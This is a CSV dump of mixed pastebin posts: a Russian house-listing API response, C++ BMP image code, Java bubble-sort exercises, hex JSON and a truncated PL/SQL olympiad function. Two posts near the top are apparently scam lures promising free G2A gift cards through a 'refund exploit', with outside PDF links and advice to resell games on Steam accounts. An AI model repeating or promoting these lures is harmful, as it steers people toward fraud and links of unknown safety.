id,title,username,language,date,content
HpAd2wJn,G2A.com Free Gift Card Guide Mar 2024,ounnuo,GetText,Monday 11th of March 2024 07:04:25 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_759880.pdf

Working as of:
11 March 2024





















"
DapVr2dU,data866,TestGuy1,JSON,Monday 11th of March 2024 07:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'a383f4a46628b56398a13f90b419b77db96341e3e214f67a0a41d970d2162c28c307b2497283a19e8b999933924c971bd2be986bd206fccf7fbb10383a641039f0f131d9968558371a305b1e0b14d73473a3996614d802b0c65353ef68c1206403b2145b29e4083263bc397e705929f69b7765a3797658637322541a0075c246',
  otherdata: [
    '69ff515ac19642789b07a788851072ce',
    'fc97c84f84ff3e40e498a563ec8d15f1',
    '4b43e289c28438dac83f470e8284606b',
    '9e03863879037950a83d0bff780d5ea6',
    '17e037d89e312c5c9b2553a9eed1ed6d',
    '92c0f9517890674b34599fbea971e192',
    'a2575a07d4f7965cc63a8cd57e5add33',
    'f151f706378102fdf6c39db9e244523e'
  ]
}"
dhKv3Myi,http://localhost:8000/api_redesign/houses/234/,kirber,JSON,Monday 11th of March 2024 06:39:11 AM CDT,"{
    ""ref_id"": ""f82cc69e-5626-ee11-b824-005056b8a6c4"",
    ""pk"": 234,
    ""id"": 234,
    ""area"": 61.0,
    ""land_area"": 6.22,
    ""status"": 1,
    ""project"": ""Дмитров Дом"",
    ""project_id"": 69016,
    ""number"": ""170"",
    ""room_count"": null,
    ""floor_count"": 1,
    ""price"": 11228162,
    ""old_price"": null,
    ""land_price"": 1571943,
    ""type"": ""XXS Оптимум продольный"",
    ""has_balcony"": false,
    ""has_terrace"": false,
    ""in_favorite"": false,
    ""mortgage_payment"": 37711,
    ""deposit"": 1684224,
    ""completion_date"": ""31 дек. 2024"",
    ""facades"": [
        {
            ""image"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/house/facade/%D0%94%D0%BC%D0%B8%D1%82%D1%80%D0%BE%D0%B2_%D0%98%D0%96%D0%A1_%D0%B2%D1%8B%D0%B1%D0%BE%D1%80%D1%89%D0%B8%D0%BA_Optimum_Prod_2023-07-03.jpg"",
            ""name"": null,
            ""features"": []
        }
    ],
    ""floor_layouts"": [
        {
            ""floor"": 1,
            ""plan"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/house/floor_layout/f82cc69e-5626-ee11-b824-005056b8a6c4_1.svg""
        }
    ],
    ""note"": null,
    ""hover"": ""<polygon id=\""k12.23\"" class=\""st0\"" points=\""676,191.6 676,189 694,189 694,193.6 694,204.3 692.5,204.3 692.5,200.1 676,200.1 \t\""/>"",
    ""project_settings"": {
        ""deposit"": 15.0,
        ""rate"": 5.5,
        ""term"": 30.0,
        ""deposit_max"": 12.0
    },
    ""url"": ""http://localhost:8000/project/dmitrov-dom/houses/234/"",
    ""has_kitchen"": true,
    ""has_furniture_set"": false,
    ""has_additional_buildings"": true,
    ""has_landscape_solutions"": true,
    ""has_hedges"": false,
    ""renovation"": true,
    ""hidden"": false,
    ""booking_available"": true,
    ""project_slug"": ""dmitrov-dom"",
    ""realty_type"": ""house"",
    ""article"": ""ДМИ1/1/12-12.23/Д"",
    ""project_ref_id"": ""89912d11-9da8-ed11-b824-005056b8a6c4"",
    ""keys_2023"": false,
    ""keys_2024"": true,
    ""disable_booking"": false,
    ""bedroom_count"": 2,
    ""genplan"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/project/genplan/%D0%94%D0%BC%D0%B8%D1%82%D1%80%D0%BE%D0%B2_%D0%98%D0%96%D0%A1_%D0%B3%D0%B5%D0%BD%D0%BF%D0%BB%D0%B0%D0%BD_%D0%BA%D1%80%D1%83%D0%BF%D0%BD%D1%8B%D0%B9_2023-01-17.jpg"",
    ""room_set"": [
        {
            ""name"": ""Санузел 1"",
            ""area"": 3.95
        },
        {
            ""name"": ""1 этаж_Кладовая 1 "",
            ""area"": 4.2
        },
        {
            ""name"": ""Прихожая_1"",
            ""area"": 4.55
        },
        {
            ""name"": ""Прихожая_1"",
            ""area"": 4.2
        },
        {
            ""name"": ""2 этаж_Спальня 3 "",
            ""area"": 9.2
        },
        {
            ""name"": ""2 этаж_Спальня 3 "",
            ""area"": 9.9
        },
        {
            ""name"": ""1 этаж_Кухня-Столовая (По СП)"",
            ""area"": 22.04
        }
    ],
    ""kitchens"": {
        ""kitchen_with_machinery"": [
            {
                ""category"": {
                    ""id"": 86,
                    ""title"": ""Оптимум дом"",
                    ""slug"": ""optimum_house"",
                    ""description"": """",
                    ""icon"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/constructor/kitchen/image_22307_vvSCiBb_4040_gqAb8O8.png"",
                    ""order"": 0,
                    ""ref_id"": 100000011
                },
                ""id"": ""d8bc5118-0e6c-ee11-b824-005056b8a6c4"",
                ""kitchen"": {
                    ""id"": 459,
                    ""advantages"": [
                        {
                            ""id"": 1659,
                            ""property"": ""Материал фасада"",
                            ""title"": ""МДФ в глянцевой пленке"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1660,
                            ""property"": ""Ручки"",
                            ""title"": ""Накладные для нижних фасадов. Верхние секции без лицевой фурнитуры — ручка Air"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1661,
                            ""property"": ""Фурнитура"",
                            ""title"": ""Европейская с доводчиками"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1662,
                            ""property"": ""Столешница и стеновая панель"",
                            ""title"": ""Пластик HPL 4 категории"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1663,
                            ""property"": ""Цвет каркаса"",
                            ""title"": ""Белый"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1664,
                            ""property"": ""Высота кухни"",
                            ""title"": ""2470 мм"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1665,
                            ""property"": ""Сантехника"",
                            ""title"": ""Мойка из нержавеющей стали, смеситель — хромированный"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1666,
                            ""property"": ""Аксессуары"",
                            ""title"": ""Интегрируемая розетка в столешнице"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1667,
                            ""property"": ""Дополнения"",
                            ""title"": ""1. Кухня длиннее 2. Есть посудомоечная машина 3. Варочная панель на четыре конфорки 4. Над холодильником есть секция и обшивка по бокам 5. Навесные шкафы выше (960 мм)"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1668,
                            ""property"": ""Комплект бытовой техники (Haier или аналоги)"",
                            ""title"": ""Встраиваемая техника: духовой шкаф, вытяжка, посудомоечная машина, варочная панель на четыре конфорки; холодильник отдельностоящий"",
                            ""help_text"": """"
                        }
                    ],
                    ""image_list"": [],
                    ""style"": {
                        ""id"": 1,
                        ""icon"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/constructor/kitchen/Frame_26649_3.png"",
                        ""title"": ""White Gloss"",
                        ""ref_id"": 100000002
                    },
                    ""ref_id"": null,
                    ""title"": ""White Gloss optimum_house"",
                    ""description"": ""<p>Высота кухни 2&nbsp;230&nbsp;мм. Фасады&nbsp;&mdash; белые, глянцевые. Каркас&nbsp;&mdash; цвет белый. Европейская фурнитура.</p>"",
                    ""default"": false,
                    ""order"": 0,
                    ""for_landing"": false,
                    ""has_machinery"": true,
                    ""parent"": null,
                    ""category"": 86
                },
                ""price"": 883330,
                ""ref_id"": ""d8bc5118-0e6c-ee11-b824-005056b8a6c4"",
                ""has_machinery"": true,
                ""toggle_markup"": true
            },
            {
                ""category"": {
                    ""id"": 1,
                    ""title"": ""Стандарт"",
                    ""slug"": ""standard"",
                    ""description"": ""Высота кухни 2 470 мм. Фасады на выбор: матовая / глянцевая пленка, цвет серый + белый / белый. Каркас — цвет белый. Европейская фурнитура"",
                    ""icon"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/constructor/kitchen/Frame_26521_MPcDymu_4040.png"",
                    ""order"": 0,
                    ""ref_id"": 100000001
                },
                ""id"": ""dabc5118-0e6c-ee11-b824-005056b8a6c4"",
                ""kitchen"": {
                    ""id"": 179,
                    ""advantages"": [
                        {
                            ""id"": 629,
                            ""property"": ""Доставка и сборка мебели"",
                            ""title"": ""true"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 630,
                            ""property"": ""Материал фасада"",
                            ""title"": ""МДФ в глянцевой пленке"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 631,
                            ""property"": ""Ручки"",
                            ""title"": ""Накладные - для нижних фасадов. Верхние секции без лицевой фурнитуры - ручка Air"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 632,
                            ""property"": ""Фурнитура"",
                            ""title"": ""Европейская с доводчиками"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 633,
                            ""property"": ""Столешница и стеновая панель"",
                            ""title"": ""Пластик HPL 4 категории"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 634,
                            ""property"": ""Цвет каркаса"",
                            ""title"": ""Белый"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 635,
                            ""property"": ""Цвет фасада"",
                            ""title"": ""Белые глянцевые"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 636,
                            ""property"": ""Высота кухни"",
                            ""title"": ""2 470 мм"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 637,
                            ""property"": ""Сантехника"",
                            ""title"": ""Мойка из нержавеющей стали, смеситель - хромированный"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 638,
                            ""property"": ""Бытовая техника"",
                            ""title"": ""Haier из линейки стандарт\\ или бренды  аналоги. Приборы: отдельно стоящий (соло) холодильник, встраиваемый духовой шкаф, встраиваемая посудомоечная машина, встраиваемая вытяжка, варочная панель"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 639,
                            ""property"": ""Аксессуары"",
                            ""title"": ""Интегрируемая розетка в столешнице"",
                            ""help_text"": """"
                        }
                    ],
                    ""image_list"": [],
                    ""style"": {
                        ""id"": 1,
                        ""icon"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/constructor/kitchen/Frame_26649_3.png"",
                        ""title"": ""White Gloss"",
                        ""ref_id"": 100000002
                    },
                    ""ref_id"": null,
                    ""title"": ""White Gloss standard"",
                    ""description"": ""<p>Высота кухни 2 470 мм. Фасады на выбор матовая / глянцевая пленка, цвет серый + белый / белый. Каркас - цвет белый. Европейская фурнитура.</p>"",
                    ""default"": false,
                    ""order"": 8,
                    ""for_landing"": true,
                    ""has_machinery"": true,
                    ""parent"": null,
                    ""category"": 1
                },
                ""price"": 920865,
                ""ref_id"": ""dabc5118-0e6c-ee11-b824-005056b8a6c4"",
                ""has_machinery"": true,
                ""toggle_markup"": true
            },
            {
                ""category"": {
                    ""id"": 85,
                    ""title"": ""Оптимум дом продольный"",
                    ""slug"": ""optimum_house_prod"",
                    ""description"": """",
                    ""icon"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/constructor/kitchen/image_22307_vvSCiBb_4040_o8pqUpe_uENRBjT.png"",
                    ""order"": 0,
                    ""ref_id"": 100000013
                },
                ""id"": ""d6bc5118-0e6c-ee11-b824-005056b8a6c4"",
                ""kitchen"": {
                    ""id"": 458,
                    ""advantages"": [
                        {
                            ""id"": 1669,
                            ""property"": ""Материал фасада"",
                            ""title"": ""МДФ в глянцевой пленке"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1670,
                            ""property"": ""Ручки"",
                            ""title"": ""Накладные для нижних фасадов.  Верхние секции без лицевой фурнитуры - ручка Air"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1671,
                            ""property"": ""Фурнитура"",
                            ""title"": ""Европейская с доводчиками"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1672,
                            ""property"": ""Столешница и стеновая панель"",
                            ""title"": ""Пластик HPL 4 категории"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1673,
                            ""property"": ""Цвет каркаса"",
                            ""title"": ""Белый"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1674,
                            ""property"": ""Высота кухни"",
                            ""title"": ""2470 мм"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1675,
                            ""property"": ""Сантехника"",
                            ""title"": ""Мойка из нержавеющей стали, смеситель - хромированный"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1676,
                            ""property"": ""Аксессуары"",
                            ""title"": ""Интегрируемая розетка в столешнице"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1677,
                            ""property"": ""Дополнения"",
                            ""title"": ""1. Кухня длиннее 2. Есть посудомоечная машина 3. Варочная панель на 4 конфорки 4. Над холодильником есть секция и обшивка по бокам 5. Навесные шкафы выше (960 мм)"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1678,
                            ""property"": ""Комплект бытовой техники (Haier или аналоги)"",
                            ""title"": ""Встраиваемая техника:духовой шкаф, вытяжка, посудомоечная машина, варочная панель на 4 конфорки; холодильник отдельностоящий"",
                            ""help_text"": """"
                        }
                    ],
                    ""image_list"": [],
                    ""style"": {
                        ""id"": 1,
                        ""icon"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/constructor/kitchen/Frame_26649_3.png"",
                        ""title"": ""White Gloss"",
                        ""ref_id"": 100000002
                    },
                    ""ref_id"": null,
                    ""title"": ""White Gloss optimum_house_prod"",
                    ""description"": ""<p>Высота кухни 2 230 мм. Фасады - белые, глянцевые. Каркас - цвет белый. Европейская фурнитура.</p>"",
                    ""default"": false,
                    ""order"": 0,
                    ""for_landing"": false,
                    ""has_machinery"": true,
                    ""parent"": null,
                    ""category"": 85
                },
                ""price"": 956602,
                ""ref_id"": ""d6bc5118-0e6c-ee11-b824-005056b8a6c4"",
                ""has_machinery"": true,
                ""toggle_markup"": true
            }
        ],
        ""kitchen_without_machinery"": []
    },
    ""furnitures"": [],
    ""additional_buildings"": [
        {
            ""ref_id"": ""aa6969fb-cd11-ee11-b824-005056b8a6c4"",
            ""pk"": 3,
            ""title"": ""Беседка"",
            ""description"": ""Открытая беседка с местом для барбекю."",
            ""images"": [
                {
                    ""id"": 1,
                    ""features"": [],
                    ""order"": 0,
                    ""image"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/additional_building/image/Villa_%D0%B1%D0%B5%D1%81%D0%B5%D0%B4%D0%BA%D0%B0_2023-10-17.jpg""
                }
            ],
            ""price"": 295000,
            ""old_price"": 295000,
            ""order"": 0,
            ""is_active"": true,
            ""discount"": null
        },
        {
            ""ref_id"": ""b06969fb-cd11-ee11-b824-005056b8a6c4"",
            ""pk"": 5,
            ""title"": ""Хозяйственная постройка"",
            ""description"": ""Хозбудка для хранения садовых инструментов."",
            ""images"": [
                {
                    ""id"": 2,
                    ""features"": [],
                    ""order"": 0,
                    ""image"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/additional_building/image/Villa_%D1%85%D0%BE%D0%B7%D0%B1%D0%BB%D0%BE%D0%BA_2023-10-17.jpg""
                }
            ],
            ""price"": 445000,
            ""old_price"": 445000,
            ""order"": 0,
            ""is_active"": true,
            ""discount"": null
        },
        {
            ""ref_id"": ""c8530f63-201b-ee11-b824-005056b8a6c4"",
            ""pk"": 6,
            ""title"": ""Баня"",
            ""description"": ""В едином стиле с вашим домом."",
            ""images"": [
                {
                    ""id"": 3,
                    ""features"": [],
                    ""order"": 0,
                    ""image"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/additional_building/image/Villa_%D0%B1%D0%B0%D0%BD%D1%8F_2023-10-17.jpg""
                }
            ],
            ""price"": 955000,
            ""old_price"": 955000,
            ""order"": 0,
            ""is_active"": true,
            ""discount"": null
        },
        {
            ""Навес для автомобиля"": [
                {
                    ""ref_id"": ""d06969fb-cd11-ee11-b824-005056b8a6c4"",
                    ""pk"": 9,
                    ""title"": ""1 автомобиль"",
                    ""description"": """",
                    ""images"": [
                        {
                            ""id"": 4,
                            ""features"": [],
                            ""order"": 0,
                            ""image"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/additional_building/image/Villa_%D0%BD%D0%B0%D0%B2%D0%B5%D1%81_%D0%B4%D0%BB%D1%8F_2%D1%85_%D0%BC%D0%B0%D1%88%D0%B8%D0%BD_2023-10-17_R95LSpu.jpg""
                        }
                    ],
                    ""price"": 335000,
                    ""old_price"": 335000,
                    ""order"": 0,
                    ""is_active"": true,
                    ""discount"": null
                },
                {
                    ""ref_id"": ""d26969fb-cd11-ee11-b824-005056b8a6c4"",
                    ""pk"": 8,
                    ""title"": ""2 автомобиля"",
                    ""description"": """",
                    ""images"": [
                        {
                            ""id"": 5,
                            ""features"": [],
                            ""order"": 0,
                            ""image"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/additional_building/image/Villa_%D0%BD%D0%B0%D0%B2%D0%B5%D1%81_%D0%B4%D0%BB%D1%8F_1_%D0%BC%D0%B0%D1%88%D0%B8%D0%BD%D1%8B_2023-10-17_pwrPbE5.jpg""
                        }
                    ],
                    ""price"": 635000,
                    ""old_price"": 635000,
                    ""order"": 0,
                    ""is_active"": true,
                    ""discount"": null
                }
            ]
        }
    ],
    ""landscape_solutions"": [
        {
            ""ref_id"": ""de6969fb-cd11-ee11-b824-005056b8a6c4"",
            ""pk"": 1,
            ""title"": ""Плодовый сад"",
            ""description"": ""Плодовые деревья и кустарники в сочетании декоративными растениями подарят возможность лакомиться собственными фруктами и ягодами каждый год."",
            ""images"": [
                {
                    ""id"": 2,
                    ""features"": [],
                    ""order"": 0,
                    ""image"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/landscape_solution/image/orchardApple_21InTbM.jpg""
                }
            ],
            ""price"": 155000,
            ""old_price"": 155000,
            ""order"": 0,
            ""is_active"": true,
            ""discount"": null
        },
        {
            ""ref_id"": ""a66969fb-cd11-ee11-b824-005056b8a6c4"",
            ""pk"": 2,
            ""title"": ""Декоративный сад"",
            ""description"": ""Хвойные деревья, кустарники и декоративные растения. Благодаря сочетанию сезонных и хвойных растений, сад остается зеленым круглый год."",
            ""images"": [
                {
                    ""id"": 1,
                    ""features"": [],
                    ""order"": 0,
                    ""image"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/landscape_solution/image/pine_Q4BKs55.jpg""
                }
            ],
            ""price"": 155000,
            ""old_price"": 155000,
            ""order"": 0,
            ""is_active"": true,
            ""discount"": null
        }
    ],
    ""hedges"": [],
    ""hedge_markup"": 18600,
    ""terrace_markups"": [],
    ""renovation_markup"": {
        ""ref_id"": null
    },
    ""kitchen_markup"": 0,
    ""building"": 2279,
    ""price_with_kitchen"": 12111492,
    ""old_price_with_kitchen"": 12111492,
    ""electricity"": true,
    ""water_supply"": true,
    ""gas"": true,
    ""projecttrait_set"": [
        {
            ""id"": 232,
            ""name"": ""Отделка"",
            ""text"": ""Дома под ключ с готовой отделкой и ком­муни­каци­ями"",
            ""icon"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/project/traits/Icons_8t6nNbT.svg"",
            ""order"": 0,
            ""for_business_class"": false
        },
        {
            ""id"": 233,
            ""name"": ""Индиви­дуаль­ность"",
            ""text"": ""Единый дизайн-код"",
            ""icon"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/project/traits/Icons_7uc6f8y.svg"",
            ""order"": 1,
            ""for_business_class"": false
        },
        {
            ""id"": 234,
            ""name"": ""Архитектура"",
            ""text"": ""Современные технологии строительства"",
            ""icon"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/project/traits/Namebank-museum_Size64.svg"",
            ""order"": 2,
            ""for_business_class"": false
        },
        {
            ""id"": 235,
            ""name"": ""Наедине с природой"",
            ""text"": ""Парки, пруд с набережной и леса рядом с домом"",
            ""icon"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/project/traits/Icons_yMsmFBg.svg"",
            ""order"": 3,
            ""for_business_class"": false
        }
    ],
    ""azimuth"": 0,
    ""similar_params"": ""?price_min=10105345&price_max=12350978&building=2279&bedroom_count=2"",
    ""technology"": ""Дом из газобетонных блоков"",
    ""acquiring_amount"": 10000
}"
piNJFXVT,G2A.com Free Gift Card Guide Mar 2024 Updated,HastyBasher0,GetText,Monday 11th of March 2024 06:32:49 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.

This is not my pastebin account and im using a random inactive one to post this.
 
PDF guide here:
https://smallpdf.com/file#s=e45853d1-004b-4ae4-968e-c4f2afc13e32
 
Working as of:
11 March 2024















































"
2h8RwsjH,Negate,Gorodwest,C++,Monday 11th of March 2024 06:20:16 AM CDT,"#include ""bmp_image.h""

#include <array>
#include <fstream>
#include <string_view>

#include ""pack_defines.h""

using namespace std;

namespace img_lib {

PACKED_STRUCT_BEGIN BitmapFileHeader {
  // поля заголовка Bitmap File Header
  uint8_t signature[2]{'B', 'M'};  // symbols BM
  uint32_t size = 0;               // step (GetBMPStride) * height
  uint32_t reserve = 0;            // zeros
  uint32_t step = 54;              // BitmapFileHeader + BitmapInfoHeader
}
PACKED_STRUCT_END

PACKED_STRUCT_BEGIN BitmapInfoHeader {
  // поля заголовка Bitmap Info Header
  uint32_t size = 40;
  int32_t width = 0;
  int32_t height = 0;
  uint16_t plate = 1;
  uint16_t bitPerPixel = 24;
  uint32_t compression = 0;
  uint32_t bytes = 0;
  int32_t hRes = 11811;
  int32_t vRes = 11811;
  int32_t colors = 0;
  int32_t valuableColors = 0x1000000;
}
PACKED_STRUCT_END

// функция вычисления отступа по ширине
static int GetBMPStride(int w) { return 4 * ((w * 3 + 3) / 4); }

// напишите эту функцию
bool SaveBMP(const Path& file, const Image& image) {
  ofstream out(file, ios::binary);
  const int width = image.GetWidth();
  const int height = image.GetHeight();
  const int step = GetBMPStride(width);

  BitmapFileHeader fileHeader;
  fileHeader.size = step;
  BitmapInfoHeader infoHeader;
  infoHeader.width = width;
  infoHeader.height = height;
  infoHeader.bytes = GetBMPStride(width);

  out.write(reinterpret_cast<const char*>(&fileHeader),
            sizeof(BitmapFileHeader));
  out.write(reinterpret_cast<const char*>(&infoHeader),
            sizeof(BitmapInfoHeader));
    
  vector<char> buf(GetBMPStride(width));  
  for (int y = height - 1; y >= 0; --y) {
    for (int x = 0; x < width; ++x) {
      const auto& pixel = image.GetPixel(x, y);
      buf[x * 3] = static_cast<char>(pixel.b);
      buf[x * 3 + 1] = static_cast<char>(pixel.g);
      buf[x * 3 + 2] = static_cast<char>(pixel.r);
    }
    out.write(buf.data(), step);
  }
  return out.good();
}

// напишите эту функцию
Image LoadBMP(const Path& file) {
  BitmapFileHeader fileHeader;
  BitmapInfoHeader infoHeader;
  ifstream ifs(file, ios::binary);

  ifs.read(reinterpret_cast<char*>(&fileHeader), sizeof(BitmapFileHeader));
  ifs.read(reinterpret_cast<char*>(&infoHeader), sizeof(BitmapInfoHeader));
    
  const int width = infoHeader.width;
  const int height = infoHeader.height;
  const int step = GetBMPStride(width);

  Image image(width, height, Color::Black());
  vector<char> buf(step); 

  for (int y = height - 1; y >= 0; --y) {
    ifs.read(buf.data(), step);
    for (int x = 0; x < width; ++x) {
      auto& pixel = image.GetPixel(x, y);
      pixel.b = static_cast<byte>(buf[x * 3]);
      pixel.g = static_cast<byte>(buf[x * 3 + 1]);
      pixel.r = static_cast<byte>(buf[x * 3 + 2]);
    }
  }
  return image;
}

}  // namespace img_lib"
necTu0mq,Comparable BubbleSort.java,Aldin_SXR,Java,Monday 11th of March 2024 06:12:23 AM CDT,"public class BubbleSort {
    /* Swap marker; whether there was a swap in the inner loop */
    static boolean swapped;

    /* Perform the bubble sort algorithm */
    public static <Data extends Comparable<Data>> void sort(Data[] elements) {
        for (int i = 0; i < elements.length; i++) {
            for (int j = 1; j < elements.length - i; j++) {
                if (elements[j - 1].compareTo(elements[j]) > 0) {
                    swap(elements, j - 1, j);
                }
            }

            /* If no two elements were swapped by inner loop, then break  */
            if (!swapped) {
                break;
            }
        }
    }

    /* Swap two array elements: elements[a] with elements[b] */
    public static <Data extends Comparable<Data>> void swap(Data[] elements, int a, int b) {
        Data tmp = elements[a];
        elements[a] = elements[b];
        elements[b] = tmp;
        swapped = true; // a swap has occurred
    }
}"
i8TciG9G,comparable swap(),Aldin_SXR,Java,Monday 11th of March 2024 06:11:53 AM CDT,"/* Swap two array elements: elements[a] with elements[b] */
public static <Data extends Comparable<Data>> void swap(Data[] elements, int a, int b) {
    Data tmp = elements[a];
    elements[a] = elements[b];
    elements[b] = tmp;
    swapped = true; // a swap has occurred
}"
SxqrM1Xj,comparable bubble sort(),Aldin_SXR,Java,Monday 11th of March 2024 06:10:37 AM CDT,"public static <Data extends Comparable<Data>> void sort(Data[] elements) {
    for (int i = 0; i < elements.length; i++) {
        for (int j = 1; j < elements.length - i; j++) {
            if (elements[j - 1].compareTo(elements[j]) > 0) {
                swap(elements, j - 1, j);
            }
        }

        /* If no two elements were swapped by inner loop, then break  */
        if (!swapped) {
            break;
        }
    }
}"
kkqmWNSV,Student.java,Aldin_SXR,Java,Monday 11th of March 2024 06:07:11 AM CDT,"public class Student implements Comparable<Student> {
    String fullName;
    String department;
    double gpa;

    /* Constructor: set initial values of the Student object */
    public Student(String fullName, String department, double gpa) {
        this.fullName = fullName;
        this.department = department;
        this.gpa = gpa;
    }

    /* Compare ""this"" student to ""that"" student (the other object) */
    public int compareTo(Student that) {								// 1
        if (this.gpa > that.gpa) {										// 2
            return 1;													// 2
        } else if (this.gpa < that.gpa) {								// 3
            return -1;													// 3
        } else {														// 4
            return 0;													// 4
        }
    }
}
"
kdRBA865,BubbleSort.java,Aldin_SXR,Java,Monday 11th of March 2024 06:03:23 AM CDT,"public class BubbleSort {
    /* Swap marker; whether there was a swap in the inner loop */
    static boolean swapped;

    /* Perform the bubble sort algorithm */
    public static void sort(int[] elements) {
        for (int i = 0; i < elements.length; i++)  {                // 1
            swapped = false; // reset swap                          // 2

            for (int j = 1; j < elements.length - i; j++) {         // 3
                if (elements[j - 1] > elements[j]) {                // 4
                    swap(elements, j - 1, j);                    // 5
                }
            }

            /* If no two elements were swapped by inner loop, then break  */
            if (!swapped) {                                         // 6
                break;                                              // 6
            }
        }
    }

    /* Swap two array elements: elements[a] with elements[b] */
    public static void swap(int[] elements, int a, int b) {
        int tmp = elements[a];
        elements[a] = elements[b];
        elements[b] = tmp;
        swapped = true; // a swap has occurred
    }
}"
VwN67032,bubble swap(),Aldin_SXR,Java,Monday 11th of March 2024 06:01:46 AM CDT,"public static void swap(int[] elements, int a, int b) {
    int tmp = elements[a];
    elements[a] = elements[b];
    elements[b] = tmp;
    swapped = true; // a swap has occurred
}"
ti1VKzYC,Untitled,ILyaCyclone,PL/SQL,Monday 11th of March 2024 06:01:20 AM CDT,"
/*
 Возвращает формулировку итога очного тура, то есть всей олимпиады
*/
function get_final_formulation(A_id_web_user IN number, A_Id_Action_PK IN Number, A_ID_Discipline IN Number) return clob is
  res clob;
begin
  begin
  select
  
  '<p>По итогам проверки в очном туре олимпиады Вы набрали ' || ie.estimation_points || ' ' || wordsv_.Decline_Transfer_Subjects(40449, 'балл', ie.estimation_points)
  || ' из ' || ie.scale_notation_points
  || Case
      when ie.winner_attribute = 1 and sysdate >= to_date('06.03.' || to_char(trunc(sysdate), 'yyyy'))
        then '. Вы представлены к диплому I степени'
      when ie.winner_attribute = 2 and sysdate >= to_date('06.03.' || to_char(trunc(sysdate), 'yyyy'))
        then '. Вы представлены к диплому II степени'
      when ie.winner_attribute = 3 and sysdate >= to_date('06.03.' || to_char(trunc(sysdate), 'yyyy'))
        then '. Вы представлены к диплому III степени'
     end
  || '.</p>'
  ||
case
-- Паруса
when apk.idk_introductory_test = 3 then
/*
--2019
'<p>Запись на апелляцию будет происходить с 19 по 24 марта 2019 года включительно (необходимо сообщить свои ФИО, регистрационный номер работы):'
|| '<ul><li>по телефону (495) 684-24-10 (с 10:00 до 16:30) в будние дни;</li>'
|| '<li>по электронной почте <a href=""mailto:olymp@miit.ru"" target=""_blank"">olymp@miit.ru</a>;</li></ul></p>'
|| '<p>Апелляция по профилю «Техника и технологии» состоится 25 марта 2019 года в 11:00 в аудитории 3316 учебного корпуса №3 РУТ (МИИТ) по адресу ул. Новосущёвская, д. 22. стр. 2.</p>'
|| '<p>Апелляция по профилю «Математика» состоится 26 марта 2018 года в 12:00 в аудитории 3316 учебного корпуса №3 РУТ (МИИТ) по адресу ул. Новосущёвская, д. 22. стр. 2.</p>'
|| '<p>На апелляцию необходимо взять с собой паспорт.</p>'
|| '<p>Участникам олимпиады необходимо явиться на апелляцию лично.</p>'
--|| '<p>В соответствии с календарным планом олимпиады:'
--|| '<br/>4 апреля 2018 года состоится заключительное заседание оргкомитета, на котором будут подведены итоги олимпиады и утверждены критерии определения победителей и призёров.'
--|| '<br/>10 апреля 2018 года будут опубликованы списки призёров и победителей олимпиады.</p>'
*/

/*
'<p>Запись на апелляцию будет происходить с 18 по 22 марта 2020 года включительно (необходимо сообщить свои ФИО, регистрационный номер работы, выбранный вид апелляции):</p>'
|| '<ul>'
